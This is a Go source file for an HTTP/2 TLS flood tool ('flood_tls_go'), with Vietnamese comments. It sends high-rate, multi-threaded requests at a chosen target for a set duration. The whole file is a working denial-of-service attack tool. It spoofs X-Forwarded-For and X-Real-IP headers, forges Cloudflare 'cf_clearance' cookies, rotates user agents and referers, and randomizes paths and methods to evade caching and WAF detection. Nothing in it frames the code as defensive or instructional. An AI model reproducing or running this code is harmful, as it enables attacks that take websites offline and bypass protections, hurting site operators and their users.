package main

import (
    "crypto/tls"
    "fmt"
    "golang.org/x/net/http2"
    "math/rand"
    "net/http"
    "os"
    "strconv"
    "strings"
    "sync"
    "time"
)

var userAgents = []string{
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/113.0.0.0 Safari/537.36",
}

var referers = []string{
    "https://www.google.com/",
    "https://www.youtube.com/",
    "https://www.facebook.com/",
}

var bypassPaths = []string{
    "/favicon.ico",
    "/robots.txt",
    "/?utm="+randomString(6),
    "/.well-known/security.txt",
    "/cdn-cgi/trace",
}

var methods = []string{
    "HEAD", "GET", "OPTIONS",
}

func randomString(length int) string {
    charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    result := make([]byte, length)
    for i := range result {
        result[i] = charset[rand.Intn(len(charset))]
    }
    return string(result)
}

func buildRequest(target string) *http.Request {
    // Chọn path ngẫu nhiên để tránh cache/WAF signature
    fullURL := target + bypassPaths[rand.Intn(len(bypassPaths))]

    // Random method
    method := methods[rand.Intn(len(methods))]

    req, _ := http.NewRequest(method, fullURL, nil)

    ua := userAgents[rand.Intn(len(userAgents))]
    referer := referers[rand.Intn(len(referers))]

    // Header trình duyệt
    req.Header.Set("User-Agent", ua)
    req.Header.Set("Referer", referer)
    req.Header.Set("Accept", "*/*")
    req.Header.Set("Accept-Encoding", "gzip, deflate, br")
    req.Header.Set("Accept-Language", "en-US,en;q=0.9")
    req.Header.Set("Connection", "keep-alive")
    req.Header.Set("Cache-Control", "no-cache")
    req.Header.Set("Pragma", "no-cache")

    // Header giả lập AJAX/bot
    req.Header.Set("X-Requested-With", "XMLHttpRequest")
    req.Header.Set("X-Forwarded-For", fmt.Sprintf("127.0.%d.%d", rand.Intn(255), rand.Intn(255)))
    req.Header.Set("X-Real-IP", fmt.Sprintf("10.0.%d.%d", rand.Intn(255), rand.Intn(255)))
    req.Header.Set("X-Fake-Header"+randomString(3), randomString(5)) // gây nhiễu

    // Cookie giả
    req.Header.Set("Cookie", "cf_clearance="+randomString(32)+"; session="+randomString(16))

    return req
}

func attackMultiplex(client *http.Client, target string, rps int, stop <-chan struct{}) {
    ticker := time.NewTicker(time.Second / time.Duration(rps))
    defer ticker.Stop()

    for {
        select {
        case <-ticker.C:
            go func() {
                req := buildRequest(target)
                resp, err := client.Do(req)
                if err == nil {
                    resp.Body.Close()
                }
            }()
        case <-stop:
            return
        }
    }
}

func attackThread(target string, rps int, duration int, wg *sync.WaitGroup) {
    defer wg.Done()

    tlsConfig := &tls.Config{
        InsecureSkipVerify: true,
        NextProtos:         []string{"h2", "http/1.1"},
        CipherSuites: []uint16{
            tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
            tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
            tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
            tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
        },
        CurvePreferences: []tls.CurveID{
            tls.X25519,
            tls.CurveP256,
        },
    }

    tr := &http2.Transport{
        AllowHTTP:       false,
        TLSClientConfig: tlsConfig,
    }

    client := &http.Client{
        Transport: tr,
        Timeout:   10 * time.Second,
    }

    stop := make(chan struct{})
    go attackMultiplex(client, target, rps, stop)

    time.Sleep(time.Duration(duration) * time.Second)
    close(stop)
}

func main() {
    if len(os.Args) != 5 {
        fmt.Println("Usage: ./flood_tls_go <target> <threads> <rps> <duration>")
        return
    }

    target := os.Args[1]
    threads, _ := strconv.Atoi(os.Args[2])
    rps, _ := strconv.Atoi(os.Args[3])
    duration, _ := strconv.Atoi(os.Args[4])
    durationm := time.Duration(duration) * time.Second

    if !strings.HasPrefix(target, "https://") {
        fmt.Println("[!] Target must start with https://")
        return
    }

    fmt.Println("[+] Target :", target)
    fmt.Println("[+] Threads:", threads)
    fmt.Println("[+] RPS    :", rps)
    fmt.Println("[+] Time   :", durationm)

    rand.Seed(time.Now().UnixNano())
    var wg sync.WaitGroup

    for i := 0; i < threads; i++ {
        wg.Add(1)
        go attackThread(target, rps, duration, &wg)
    }

    wg.Wait()
}
